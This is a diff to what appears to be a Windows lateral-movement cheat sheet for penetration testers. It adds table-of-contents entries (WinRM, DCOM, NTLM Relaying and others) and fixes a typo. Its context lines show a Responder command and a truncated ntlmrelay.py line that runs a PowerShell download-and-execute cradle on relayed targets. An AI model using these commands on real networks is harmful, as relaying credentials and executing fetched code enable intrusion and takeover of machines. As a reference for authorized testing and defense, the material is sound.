@@ -19,7 +19,12 @@
   * [WMI](#WMI)
   * [Poisonhandler](#Poisonhandler)
   * [RDP](#RDP)
-
+  * [ChangeServiceConfigA](#ChangeServiceConfigA)
+  * [WinRM](#WinRM)
+  * [DCOM](#DCOM)
+  * [Named Pipes](#Named-Piped)
+  * [Powershell Web access](#Powershell-Web-access)
+  * [NTLM Relaying](#NTLM-Relaying)
 
 ## General
 #### Add domain user to localadmin
@@ -456,7 +461,7 @@ Add-PswaAuthorizationRule -Username <USERNAME> -Computername <COMPUTER> -Configu
 #### Browse to
 - https://<MACHINE NAME>/pswa
 
-### NTLM Relyaing
+### NTLM Relaying
 - https://github.com/lgandx/Responder
 - https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py
 
@@ -476,3 +481,6 @@ ntlmrelay.py -t <TARGET> -c 'powershell.exe iex (New-Object.Net.Webclient).Downl
 ```
 responder -I <INTERFACE> -v
 ```
+
+ 
+ 
